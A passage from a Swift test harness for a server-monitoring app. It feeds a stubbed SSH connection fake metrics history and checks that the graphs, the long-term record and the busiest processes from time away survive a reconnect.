        away.rows = [row]
        rings.add(processes: away)
        let historyFile = FileManager.default.temporaryDirectory.appendingPathComponent("fake-history-\(getpid()).json")
        try? rings.encoded().write(to: historyFile)
        setenv("FAKE_SSH_HISTORY", historyFile.path, 1)
        (connection, states) = run("history", seconds: 10) { c, _ in c.snapshot != nil }
        check(connection.background != .unknown && connection.background != .absent, "a history line marks the background agent as running")
        check(connection.history.cpu.count == MetricsHistory.capacity,
              "the graphs start full (\(connection.history.cpu.count) points after the first sample)")
        check(connection.rings.medium.points.count >= 100, "the long record holds the server's (\(connection.rings.medium.points.count) half-minutes)")
        check(connection.awayProcesses.samples.first?.rows.first?.name == "backup", "the busiest processes while away are kept")
        connection.stop()

        (connection, states) = run("steady", seconds: 5) { c, _ in c.snapshot != nil }
        check(connection.background == .absent, "an agent without history is marked as such")
        connection.stop()

        // Two hours away, with the background agent keeping them: the
        // record survives the first live sample after it.
        var awayRings = HistoryRings(interval: 2, started: Date().addingTimeInterval(-7200))
        for i in stride(from: 3599, through: 1, by: -1) {
            var point = HistoryPoint(t: nowMS - Int64(i) * 2000)
            point[.cpu] = 0.3
            awayRings.add(point)
        }
        try? awayRings.encoded().write(to: historyFile)
        (connection, states) = run("history-after-drop", seconds: 15) { c, seen in
            seen.contains("waiting") && seen.last == "live"
        }
        check(connection.rings.medium.points.count >= 200 && connection.rings.coarse.points.count >= 20,
              "a reconnect after time away keeps the agent's record (\(connection.rings.medium.points.count) half-minutes, "
              + "\(connection.rings.coarse.points.count) five-minute points; \(states.joined(separator: " → ")))")
        connection.stop()
        try? FileManager.default.removeItem(at: historyFile)

        print(failures == 0 ? "All connection checks passed." : "\(failures) connection check(s) failed.")
        exit(failures == 0 ? 0 : 1)
    }
}
